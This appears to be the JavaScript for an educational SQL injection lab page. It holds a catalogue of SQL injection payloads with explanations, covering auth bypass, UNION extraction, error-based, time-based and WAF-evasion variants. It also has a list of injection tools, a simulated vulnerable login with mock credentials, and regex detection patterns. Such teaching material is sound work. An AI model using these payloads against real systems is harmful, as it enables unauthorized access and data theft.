/* ============================================================
   app.js — SQLi Lab Interactive Application
   ============================================================ */

'use strict';

// ============================================================
// Data: Attack Types
// ============================================================
const ATTACK_TYPES = [
  {
    icon: '🎯',
    name: 'In-band SQLi (Classic)',
    danger: 'critical',
    desc: 'The most common and easy-to-exploit type. The attacker uses the same '
        + 'communication channel to launch the attack and gather results. '
        + 'Includes Error-based and Union-based techniques.',
  },
  {
    icon: '💥',
    name: 'Error-Based SQLi',
    danger: 'critical',
    desc: 'Relies on error messages thrown by the database server to obtain '
        + 'structural information. Sometimes sufficient alone to enumerate an '
        + 'entire database schema.',
  },
  {
    icon: '🔗',
    name: 'UNION-Based SQLi',
    danger: 'critical',
    desc: 'Leverages the SQL UNION operator to combine results of two or more '
        + 'SELECT statements into a single HTTP response, leaking data from '
        + 'arbitrary tables.',
  },
  {
    icon: '👻',
    name: 'Blind SQLi (Boolean)',
    danger: 'high',
    desc: 'No data is returned directly. The attacker infers TRUE/FALSE results '
        + 'by observing changes in the HTTP response content or behavior.',
  },
  {
    icon: '⏱️',
    name: 'Time-Based Blind SQLi',
    danger: 'high',
    desc: 'The attacker forces the database to wait a specified time before '
        + 'responding, inferring TRUE/FALSE based on response delay. '
        + 'Uses SLEEP(), WAITFOR DELAY, etc.',
  },
  {
    icon: '📡',
    name: 'Out-of-Band SQLi',
    danger: 'high',
    desc: 'Uses a different channel (DNS, HTTP) to exfiltrate data — especially '
        + 'useful when the server response is inconsistent or heavily filtered.',
  },
  {
    icon: '🔐',
    name: 'Auth Bypass SQLi',
    danger: 'critical',
    desc: 'Specifically targets login forms to bypass authentication entirely, '
        + 'often using payloads like `\' OR \'1\'=\'1` to make WHERE clauses '
        + 'always evaluate to TRUE.',
  },
  {
    icon: '🎙️',
    name: 'Voice-Based SQLi',
    danger: 'medium',
    desc: 'An emerging technique targeting voice-command interfaces that '
        + 'translate audio to database queries, injecting SQL via spoken commands.',
  },
];

// ============================================================
// Data: Payloads
// ============================================================
const PAYLOADS = [
  // Generic
  { cat: 'generic', text: "' OR '1'='1",               db: 'Any',        risk: 'critical', explanation: 'Classic tautology: forces the WHERE clause to always be TRUE, returning all rows.' },
  { cat: 'generic', text: "' OR 1=1--",                 db: 'Any',        risk: 'critical', explanation: 'Comments out the rest of the query with --, bypassing password check.' },
  { cat: 'generic', text: "\" OR \"\"=\"",              db: 'Any',        risk: 'critical', explanation: 'Double-quote variant of the tautology injection.' },
  { cat: 'generic', text: "' OR ''='",                  db: 'Any',        risk: 'critical', explanation: 'Empty string tautology that evaluates to TRUE in many SQL engines.' },
  { cat: 'generic', text: "1' ORDER BY 1--+",           db: 'Any',        risk: 'medium',   explanation: 'Used to determine the number of columns in the result set by incrementing the ORDER BY index.' },
  { cat: 'generic', text: "-1' UNION SELECT 1,2,3--+",  db: 'MySQL',      risk: 'critical', explanation: 'Starts a UNION-based injection to probe column count and data types.' },
  { cat: 'generic', text: "' AND 1=1--",                db: 'Any',        risk: 'low',      explanation: 'Boolean true condition — used in detection to verify injectable parameters.' },
  { cat: 'generic', text: "' AND 1=0--",                db: 'Any',        risk: 'low',      explanation: 'Boolean false condition — if the response changes, the parameter is injectable.' },
  { cat: 'generic', text: ";--",                        db: 'Any',        risk: 'medium',   explanation: 'Statement terminator followed by comment — truncates queries.' },
  { cat: 'generic', text: "'''''''''''''UNION SELECT '2", db: 'Any',      risk: 'medium',   explanation: 'Stress test with many quotes to break string handling.' },

  // Error-Based
  { cat: 'error', text: "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",          db: 'MySQL',   risk: 'high',     explanation: 'Triggers a nested subquery to cause a sleep — confirms MySQL error-based injection.' },
  { cat: 'error', text: " OR 3409=3409 AND ('pytW' LIKE 'pytW",               db: 'Any',     risk: 'medium',   explanation: 'Tautological condition with LIKE to probe injection with string comparisons.' },
  { cat: 'error', text: "AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", db: 'MySQL', risk: 'critical', explanation: 'Classic MySQL error-based injection using GROUP BY RAND() to force duplicate key errors that leak data.' },
  { cat: 'error', text: " and (select substring(@@version,1,1))='5'",          db: 'MySQL',   risk: 'high',     explanation: 'Probes the MySQL version character by character.' },
  { cat: 'error', text: " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='", db: 'MySQL', risk: 'high', explanation: 'Uses RLIKE/REGEX with CASE WHEN to conditionally trigger errors for boolean inference.' },
  { cat: 'error', text: "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--", db: 'MSSQL',  risk: 'critical', explanation: 'Uses IF statement — if true evaluates safely, if false attempts destructive DROP.' },

  // UNION-Based
  { cat: 'union', text: " UNION ALL SELECT 1",                                  db: 'Any',    risk: 'medium',   explanation: 'Probe with 1 column. Increment until no error to find column count.' },
  { cat: 'union', text: " UNION ALL SELECT 1,2,3",                              db: 'Any',    risk: 'medium',   explanation: '3-column union probe. Each number reveals which columns are rendered.' },
  { cat: 'union', text: " UNION SELECT @@VERSION,SLEEP(5),USER()",              db: 'MySQL',  risk: 'critical', explanation: 'Extracts DB version, username, and tests time delay simultaneously.' },
  { cat: 'union', text: " UNION ALL SELECT 'INJ'||'ECT'||'XXX'",               db: 'Oracle', risk: 'high',     explanation: 'Oracle-style string concatenation in UNION injection for fingerprinting.' },
  { cat: 'union', text: " UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--", db: 'MySQL', risk: 'critical', explanation: 'Comprehensive MySQL union payload combining version leak, user info, sleep and CPU benchmark.' },
  { cat: 'union', text: "-1 UNION SELECT 1 INTO @,@",                           db: 'MySQL',  risk: 'high',     explanation: 'MySQL-specific: dumps result into user-defined variables for further extraction.' },
  { cat: 'union', text: " UNION ALL SELECT NULL--",                              db: 'Any',    risk: 'medium',   explanation: 'NULL-based UNION probe — NULLs are type-compatible with any column.' },

  // Blind
  { cat: 'blind', text: "sleep(5)#",                                            db: 'MySQL',  risk: 'high',     explanation: 'Most basic MySQL time-based blind test. If the response delays 5s, the field is injectable.' },
  { cat: 'blind', text: "' or sleep(5)#",                                       db: 'MySQL',  risk: 'high',     explanation: 'Blind time injection injected via single-quoted string context.' },
  { cat: 'blind', text: "benchmark(10000000,MD5(1))#",                          db: 'MySQL',  risk: 'medium',   explanation: 'Causes CPU-intensive computation as an alternative to SLEEP for time-based detection.' },
  { cat: 'blind', text: "pg_sleep(5)--",                                        db: 'PostgreSQL', risk: 'high', explanation: 'PostgreSQL equivalent of SLEEP(), causes a 5-second server-side delay.' },
  { cat: 'blind', text: "' AnD SLEEP(5) ANd '1",                                db: 'MySQL',  risk: 'high',     explanation: 'Mixed-case obfuscation of AND SLEEP — evades basic WAF keyword filters.' },
  { cat: 'blind', text: "RANDOMBLOB(500000000/2)",                              db: 'SQLite', risk: 'medium',   explanation: 'SQLite time delay: allocates 250MB of random data, causing significant processing time.' },

  // Time-Based
  { cat: 'time', text: ";waitfor delay '0:0:5'--",                              db: 'MSSQL',  risk: 'high',     explanation: 'MSSQL WAITFOR DELAY syntax — forces a 5-second wait. Different from MySQL SLEEP.' },
  { cat: 'time', text: "';waitfor delay '0:0:5'--",                             db: 'MSSQL',  risk: 'high',     explanation: 'Single-quote escaped MSSQL time delay in a string context.' },
  { cat: 'time', text: "1 waitfor delay '0:0:10'--",                            db: 'MSSQL',  risk: 'high',     explanation: 'Numeric context MSSQL delay injection with 10-second wait.' },
  { cat: 'time', text: "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",   db: 'MySQL',  risk: 'high',     explanation: 'Multi-context SLEEP embedded in a comment block — polyglot time injection.' },
  { cat: 'time', text: ",(select * from (select(sleep(10)))a)",                 db: 'MySQL',  risk: 'high',     explanation: 'Comma-prefixed sleep injection for insertion into multi-value contexts.' },
  { cat: 'time', text: "+ SLEEP(10) + '",                                       db: 'MySQL',  risk: 'high',     explanation: 'Arithmetic concatenation of SLEEP for contexts where + is the concatenation operator.' },

  // Auth Bypass
  { cat: 'auth', text: "admin' --",                                             db: 'Any',    risk: 'critical', explanation: 'Most common admin bypass: the -- comments out the password check entirely.' },
  { cat: 'auth', text: "admin' OR '1'='1",                                      db: 'Any',    risk: 'critical', explanation: 'Forces the WHERE clause to be TRUE regardless of password.' },
  { cat: 'auth', text: "' OR 1=1 LIMIT 1;#",                                   db: 'MySQL',  risk: 'critical', explanation: 'Bypasses auth and limits to 1 row (admin is usually first). # for MySQL comment.' },
  { cat: 'auth', text: "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", db: 'Any', risk: 'critical', explanation: 'Injects a known MD5 hash (1234) as the password — an advanced bypass using UNION.' },
  { cat: 'auth', text: "' UNION ALL SELECT system_user(),user();#",             db: 'MySQL',  risk: 'critical', explanation: 'Extracts DB system user and current user via UNION in an authentication query.' },
  { cat: 'auth', text: "' or true--",                                           db: 'Any',    risk: 'critical', explanation: 'Boolean TRUE literal bypass — some databases accept TRUE keyword directly.' },
  { cat: 'auth', text: "'or'1=1",                                               db: 'Any',    risk: 'critical', explanation: 'Compact no-space variant — evades some WAF rules that require spaces around OR.' },
  { cat: 'auth', text: "'='or'",                                                db: 'Any',    risk: 'high',     explanation: 'Equality short-circuit: \'=\' evaluates as empty string equal to empty string (TRUE).' },
  { cat: 'auth', text: "admin'/*",                                              db: 'MySQL',  risk: 'critical', explanation: 'Block-comment version: /* opens a comment, ignoring the rest of the query.' },
  { cat: 'auth', text: "' group by password having 1=1--",                     db: 'MSSQL',  risk: 'high',     explanation: 'Uses GROUP BY HAVING to extract column information via error messages.' },
];

// ============================================================
// Data: Tools
// ============================================================
const TOOLS = [
  {
    name: 'SQLMap',
    url: 'https://github.com/sqlmapproject/sqlmap',
    desc: 'The gold standard for automated SQL injection detection and exploitation. Supports virtually all database types and injection techniques.',
    tags: ['Automated', 'Multi-DB', 'CLI', 'Python'],
  },
  {
    name: 'jSQL Injection',
    url: 'https://github.com/ron190/jsql-injection',
    desc: 'Java-based GUI tool for automatic SQL database injection. Supports multiple injection strategies and database fingerprinting.',
    tags: ['GUI', 'Java', 'Multi-DB'],
  },
  {
    name: 'BBQSQL',
    url: 'https://github.com/Neohapsis/bbqsql',
    desc: 'Blind SQL injection exploitation framework in Python. Highly configurable and optimized for speed with binary search algorithms.',
    tags: ['Blind SQLi', 'Python', 'CLI'],
  },
  {
    name: 'NoSQLMap',
    url: 'https://github.com/codingo/NoSQLMap',
    desc: 'Automated NoSQL database auditing and exploitation tool. Targets MongoDB, CouchDB, and other NoSQL systems.',
    tags: ['NoSQL', 'MongoDB', 'Automated'],
  },
  {
    name: 'DSSS',
    url: 'https://github.com/stamparm/DSSS',
    desc: 'Damn Small SQLi Scanner — extremely lightweight (< 100 lines) scanner for SQL injection vulnerabilities.',
    tags: ['Lightweight', 'Scanner', 'Python'],
  },
  {
    name: 'Blisqy',
    url: 'https://github.com/JohnTroony/Blisqy',
    desc: 'Exploits time-based blind SQL injection in HTTP headers against MySQL and MariaDB. Ideal for header-based injection.',
    tags: ['Time-Based', 'HTTP Headers', 'MySQL'],
  },
];

// ============================================================
// Data: Quick Inject Presets for Demo
// ============================================================
const QUICK_PAYLOADS = [
  { label: "' OR '1'='1",       user: "admin",         pass: "' OR '1'='1" },
  { label: "admin' --",         user: "admin' --",     pass: "anything"    },
  { label: "' OR 1=1--",        user: "' OR 1=1--",    pass: "x"           },
  { label: "'or'1=1",           user: "admin",         pass: "'or'1=1"     },
  { label: "' OR true--",       user: "' OR true--",   pass: "x"           },
  { label: "Wrong Password",    user: "admin",         pass: "wrong123"    },
  { label: "Valid Login",       user: "alice",         pass: "secret42"    },
  { label: "Empty Fields",      user: "",              pass: ""            },
];

// ============================================================
// Mock "Database" for Demo
// ============================================================
const MOCK_USERS = [
  { username: 'admin',  password: 'adminpass',  role: 'Administrator' },
  { username: 'alice',  password: 'secret42',   role: 'User'          },
  { username: 'bob',    password: 'hunter2',    role: 'User'          },
  { username: 'carlos', password: 'letmein',    role: 'Moderator'     },
];

const SQL_INJECTION_PATTERNS = [
  /'\s*(or|and)\s+['"\d]/i,
  /--\s*$/,
  /\/\*/,
  /union\s+(all\s+)?select/i,
  /sleep\s*\(/i,
  /waitfor\s+delay/i,
  /benchmark\s*\(/i,
  /pg_sleep\s*\(/i,
  /'\s*=\s*'/,
  /or\s+true/i,
  /or\s+1\s*=\s*1/i,
  /;\s*--/,
  /'\s*or\s*'[^']*'\s*=\s*'[^']*/i,
  /'or'/i,
];

// ============================================================
// Utilities
// ============================================================
/**
 * Detects SQL injection patterns in a string.
 * @param {string} str
 * @returns {boolean}
 */
function detectInjection(str) {
  return SQL_INJECTION_PATTERNS.some((re) => re.test(str));
}

/**
 * Escape HTML to prevent XSS in displayed payloads.
 * @param {string} str
 * @returns {string}
 */
function escHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Show a brief toast notification.
 * @param {string} msg
 */
function showToast(msg) {
  const el = document.getElementById('toast');
  if (!el) return;
  el.textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 2200);
}

/**
 * Copy text to clipboard.
 * @param {string} text
 */
async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
    showToast('✅ Copied to clipboard!');
  } catch {
    showToast('⚠️ Copy failed — select manually.');
  }
}

/**
 * Animate a counter from 0 to target.
 * @param {HTMLElement} el
 * @param {number} target
 * @param {number} duration ms
 */
function animateCounter(el, target, duration) {
  const start  = performance.now();
  const suffix = target >= 500 ? '+' : '';
  const step   = (ts) => {
    const prog = Math.min((ts - start) / duration, 1);
    const ease = 1 - Math.pow(1 - prog, 3);
    el.textContent = Math.floor(ease * target) + suffix;
    if (prog < 1) requestAnimationFrame(step);
  };
  requestAnimationFrame(step);
}

// ============================================================
// Hero Typewriter Code Animation
// ============================================================
const HERO_CODE_FRAMES = [
  `<span class="hl-cmt">-- Authentication Query</span>
<span class="hl-kw">SELECT</span> * <span class="hl-kw">FROM</span> users
  <span class="hl-kw">WHERE</span> username = <span class="hl-str">'admin'</span>
    <span class="hl-kw">AND</span> password = <span class="hl-str">'...'</span>`,

  `<span class="hl-cmt">-- Injection Attempt →</span>
<span class="hl-kw">SELECT</span> * <span class="hl-kw">FROM</span> users
  <span class="hl-kw">WHERE</span> username = <span class="hl-str">'<span class="hl-inj">admin' --</span></span>
    <span class="hl-kw">AND</span> password = <span class="hl-str">'<span class="hl-cmt">-- ignored</span>'</span>`,

  `<span class="hl-cmt">-- UNION Exfiltration</span>
<span class="hl-kw">SELECT</span> * <span class="hl-kw">FROM</span> users
  <span class="hl-kw">WHERE</span> id = <span class="hl-num">-1</span>
<span class="hl-inj">  UNION SELECT @@VERSION,
    USER(), database(), NULL--</span>`,

  `<span class="hl-cmt">-- Time-Based Blind</span>
<span class="hl-kw">SELECT</span> * <span class="hl-kw">FROM</span> users
  <span class="hl-kw">WHERE</span> id = <span class="hl-num">1</span>
  <span class="hl-kw">AND</span> (<span class="hl-kw">SELECT</span> * <span class="hl-kw">FROM</span>
    (<span class="hl-kw">SELECT</span>(<span class="hl-fn">SLEEP</span>(<span class="hl-num">5</span>)))nQIP)`,
];

let heroFrameIdx = 0;

function startHeroAnimation() {
  const el = document.getElementById('hero-code-content');
  if (!el) return;
  el.innerHTML = HERO_CODE_FRAMES[0];

  setInterval(() => {
    heroFrameIdx = (heroFrameIdx + 1) % HERO_CODE_FRAMES.length;
    el.style.opacity = '0';
    el.style.transition = 'opacity .4s';
    setTimeout(() => {
      el.innerHTML = HERO_CODE_FRAMES[heroFrameIdx];
      el.style.opacity = '1';
    }, 400);
  }, 3500);
}

// ============================================================
// Hero Counter Animation (IntersectionObserver)
// ============================================================
function initCounters() {
  const nums = document.querySelectorAll('.stat-num');
  const obs  = new IntersectionObserver((entries) => {
    entries.forEach((e) => {
      if (e.isIntersecting) {
        const target = parseInt(e.target.dataset.count, 10);
        animateCounter(e.target, target, 1200);
        obs.unobserve(e.target);
      }
    });
  }, { threshold: 0.4 });
  nums.forEach((el) => obs.observe(el));
}

// ============================================================
// Render: Attack Types
// ============================================================
function renderAttackTypes() {
  const grid = document.getElementById('types-grid');
  if (!grid) return;

  grid.innerHTML = ATTACK_TYPES.map((t) => `
    <article class="type-card" role="listitem">
      <span class="type-icon" aria-hidden="true">${t.icon}</span>
      <h3 class="type-name">${escHtml(t.name)}</h3>
      <p class="type-desc">${escHtml(t.desc)}</p>
      <span class="type-danger danger-${t.danger}">
        ${t.danger === 'critical' ? '🔴' : t.danger === 'high' ? '🟠' : '🟡'}
        ${t.danger.charAt(0).toUpperCase() + t.danger.slice(1)}
      </span>
    </article>
  `).join('');
}

// ============================================================
// Payload Explorer State & Rendering
// ============================================================
const CAT_COLORS = {
  generic: '#6c63ff',
  error:   '#f87171',
  union:   '#22d3ee',
  blind:   '#34d399',
  time:    '#fb923c',
  auth:    '#a78bfa',
};

const RISK_LEVELS = {
  critical: 5,
  high:     4,
  medium:   3,
  low:      1,
};

let payloadState = {
  cat:      'all',
  query:    '',
  page:     0,
  pageSize: 20,
  selected: null,
};

function getFilteredPayloads() {
  return PAYLOADS.filter((p) => {
    const catOk   = payloadState.cat === 'all' || p.cat === payloadState.cat;
    const queryOk = !payloadState.query
      || p.text.toLowerCase().includes(payloadState.query.toLowerCase())
      || p.db.toLowerCase().includes(payloadState.query.toLowerCase())
      || p.cat.toLowerCase().includes(payloadState.query.toLowerCase());
    return catOk && queryOk;
  });
}

function renderPayloadList() {
  const list    = document.getElementById('payload-list');
  const countEl = document.getElementById('payload-count');
  const moreBtn = document.getElementById('load-more-btn');
  if (!list) return;

  const filtered = getFilteredPayloads();
  const end      = (payloadState.page + 1) * payloadState.pageSize;
  const slice    = filtered.slice(0, end);

  countEl.textContent = `Showing ${slice.length} of ${filtered.length} payloads`;
  moreBtn.style.display = slice.length < filtered.length ? 'block' : 'none';

  list.innerHTML = slice.map((p, i) => `
    <div
      class="payload-item${payloadState.selected === i ? ' selected' : ''}"
      id="payload-item-${i}"
      role="listitem"
      tabindex="0"
      data-idx="${i}"
      aria-label="${escHtml(p.text)}"
    >
      <span class="payload-cat-dot" style="background:${CAT_COLORS[p.cat] || '#888'}"></span>
      <span class="payload-text">${escHtml(p.text)}</span>
      <span class="payload-copy-mini" aria-hidden="true">copy</span>
    </div>
  `).join('');

  list.querySelectorAll('.payload-item').forEach((el) => {
    el.addEventListener('click', () => selectPayload(parseInt(el.dataset.idx, 10)));
    el.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        selectPayload(parseInt(el.dataset.idx, 10));
      }
    });
  });
}

function selectPayload(idx) {
  const filtered = getFilteredPayloads();
  const p        = filtered[idx];
  if (!p) return;

  payloadState.selected = idx;
  renderPayloadList();

  const placeholder = document.getElementById('detail-placeholder');
  const content     = document.getElementById('detail-content');
  const codeEl      = document.getElementById('detail-code');
  const badgeEl     = document.getElementById('detail-badge');
  const catEl       = document.getElementById('detail-meta-category');
  const dbEl        = document.getElementById('detail-meta-db');
  const riskBar     = document.getElementById('detail-risk-bar');
  const explain     = document.getElementById('detail-explanation');

  if (placeholder) placeholder.style.display = 'none';
  if (content)     content.style.display = 'block';

  if (codeEl)  codeEl.textContent  = p.text;
  if (badgeEl) badgeEl.textContent = p.cat.charAt(0).toUpperCase() + p.cat.slice(1);
  if (catEl)   catEl.textContent   = p.cat.charAt(0).toUpperCase() + p.cat.slice(1);
  if (dbEl)    dbEl.textContent    = p.db;
  if (explain) explain.textContent = p.explanation;

  // Risk pips
  if (riskBar) {
    const level    = RISK_LEVELS[p.risk] || 1;
    const maxPips  = 5;
    riskBar.innerHTML = Array.from({ length: maxPips }, (_, i) => {
      const active = i < level ? `active-${p.risk}` : '';
      return `<span class="risk-pip ${active}"></span>`;
    }).join('');
  }

  // Copy button
  const copyBtn = document.getElementById('detail-copy-btn');
  if (copyBtn) {
    copyBtn.onclick = () => copyText(p.text);
  }
}

function initPayloadExplorer() {
  // Search
  const search = document.getElementById('payload-search');
  if (search) {
    search.addEventListener('input', () => {
      payloadState.query    = search.value;
      payloadState.page     = 0;
      payloadState.selected = null;
      renderPayloadList();
    });
  }

  // Tabs
  const tabs = document.querySelectorAll('.tab');
  tabs.forEach((tab) => {
    tab.addEventListener('click', () => {
      tabs.forEach((t) => { t.classList.remove('active'); t.setAttribute('aria-selected', 'false'); });
      tab.classList.add('active');
      tab.setAttribute('aria-selected', 'true');
      payloadState.cat      = tab.dataset.cat;
      payloadState.page     = 0;
      payloadState.selected = null;
      renderPayloadList();
    });
  });

  // Load more
  const moreBtn = document.getElementById('load-more-btn');
  if (moreBtn) {
    moreBtn.addEventListener('click', () => {
      payloadState.page++;
      renderPayloadList();
    });
  }

  // Keyboard shortcut ⌘K / Ctrl+K
  document.addEventListener('keydown', (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
      e.preventDefault();
      const s = document.getElementById('payload-search');
      if (s) { s.focus(); s.select(); }
    }
  });

  renderPayloadList();
}

// ============================================================
// Live Demo
// ============================================================
/**
 * Simulates a vulnerable SQL query — for educational display only.
 * @param {string} user
 * @param {string} pass
 * @returns {{ query: string, injected: boolean, result: 'success'|'error'|'bypass' }}
 */
function simulateLogin(user, pass) {
  const injectedUser = detectInjection(user);
  const injectedPass = detectInjection(pass);
  const injected     = injectedUser || injectedPass;

  // Build the "vulnerable" query string
  const query = `SELECT * FROM users\nWHERE username = '${user}'\nAND password = '${pass}'`;

  let result;
  if (injected) {
    // Simulate bypass — injection detected
    result = 'bypass';
  } else {
    // Normal auth
    const match = MOCK_USERS.find((u) => u.username === user && u.password === pass);
    result = match ? 'success' : 'error';
  }

  return { query, injected, result };
}

function updateSqlConsole(user, pass) {
  const qEl    = document.getElementById('console-query');
  const rEl    = document.getElementById('console-result');
  const aEl    = document.getElementById('injection-analysis');

  if (!qEl || !rEl || !aEl) return;

  const { query, injected, result } = simulateLogin(user, pass);

  // Highlight injection in query
  const safe = escHtml(query);
  qEl.innerHTML = safe
    .replace(escHtml(user), `<span class="hl-inject">${escHtml(user)}</span>`)
    .replace(escHtml(pass),  `<span class="hl-inject">${escHtml(pass)}</span>`);

  if (injected) {
    aEl.innerHTML = `<span class="analysis-detected">⚠️ SQL INJECTION DETECTED! Patterns found in input — query has been compromised.</span>`;
  } else {
    aEl.innerHTML = `<span class="analysis-safe">✅ No injection detected — input appears safe.</span>`;
  }

  const demoResult = document.getElementById('demo-result');

  if (result === 'bypass') {
    rEl.innerHTML = `<span class="result-bypassed">⚠️ Authentication BYPASSED! Injected condition forced TRUE — attacker logged in without credentials.</span>`;
    if (demoResult) {
      demoResult.className  = 'demo-result warning';
      demoResult.textContent = '🚨 INJECTION BYPASS! Logged in as: admin (Administrator)';
    }
  } else if (result === 'success') {
    const u = MOCK_USERS.find((m) => m.username === user);
    rEl.innerHTML = `<span class="result-success">✅ Authentication successful. Welcome, ${escHtml(u?.role || 'User')}!</span>`;
    if (demoResult) {
      demoResult.className  = 'demo-result success';
      demoResult.textContent = `✅ Login successful! Welcome, ${user} (${u?.role})`;
    }
  } else {
    rEl.innerHTML = `<span class="result-error">❌ Authentication failed. No matching user/password combination found.</span>`;
    if (demoResult) {
      demoResult.className  = 'demo-result error';
      demoResult.textContent = '❌ Invalid credentials. Login failed.';
    }
  }
}

function initDemo() {
  const loginBtn  = document.getElementById('demo-login-btn');
  const userInput = document.getElementById('demo-username');
  const passInput = document.getElementById('demo-password');
  const qpWrap    = document.getElementById('quick-payloads');

  if (loginBtn) {
    loginBtn.addEventListener('click', () => {
      const u = userInput ? userInput.value : '';
      const p = passInput ? passInput.value : '';
      updateSqlConsole(u, p);
    });
  }

  // Pressing Enter also submits
  [userInput, passInput].forEach((inp) => {
    if (inp) {
      inp.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          updateSqlConsole(
            userInput ? userInput.value : '',
            passInput ? passInput.value : '',
          );
        }
      });
      // Live update console query
      inp.addEventListener('input', () => {
        const qEl = document.getElementById('console-query');
        if (qEl) {
          const u = userInput ? userInput.value : '';
          const p = passInput ? passInput.value : '';
          qEl.innerHTML = `SELECT * FROM users\nWHERE username = &#39;<span class="hl-inject">${escHtml(u)}</span>&#39;\nAND password = &#39;<span class="hl-val">${escHtml(p)}</span>&#39;`;
        }
      });
    }
  });

  // Quick Payloads
  if (qpWrap) {
    qpWrap.innerHTML = QUICK_PAYLOADS.map((qp, i) => `
      <button class="quick-chip" id="quick-chip-${i}" aria-label="Inject: ${escHtml(qp.label)}">
        ${escHtml(qp.label)}
      </button>
    `).join('');

    qpWrap.querySelectorAll('.quick-chip').forEach((btn, i) => {
      btn.addEventListener('click', () => {
        const qp = QUICK_PAYLOADS[i];
        if (userInput) userInput.value = qp.user;
        if (passInput) passInput.value = qp.pass;
        updateSqlConsole(qp.user, qp.pass);
      });
    });
  }
}

// ============================================================
// Render: Tools
// ============================================================
function renderTools() {
  const grid = document.getElementById('tools-grid');
  if (!grid) return;

  grid.innerHTML = TOOLS.map((t, i) => `
    <article class="tool-card" role="listitem" id="tool-card-${i}">
      <div class="tool-name">${escHtml(t.name)}</div>
      <p class="tool-desc">${escHtml(t.desc)}</p>
      <div class="tool-tags">
        ${t.tags.map((tag) => `<span class="tool-tag">${escHtml(tag)}</span>`).join('')}
      </div>
    </article>
  `).join('');
}

// ============================================================
// Navbar scroll effect
// ============================================================
function initNavbar() {
  const nav = document.getElementById('navbar');
  if (!nav) return;
  window.addEventListener('scroll', () => {
    if (window.scrollY > 20) {
      nav.style.background = 'rgba(8,11,20,.95)';
    } else {
      nav.style.background = 'rgba(8,11,20,.8)';
    }
  }, { passive: true });
}

// ============================================================
// Init
// ============================================================
document.addEventListener('DOMContentLoaded', () => {
  startHeroAnimation();
  initCounters();
  renderAttackTypes();
  initPayloadExplorer();
  initDemo();
  renderTools();
  initNavbar();
});
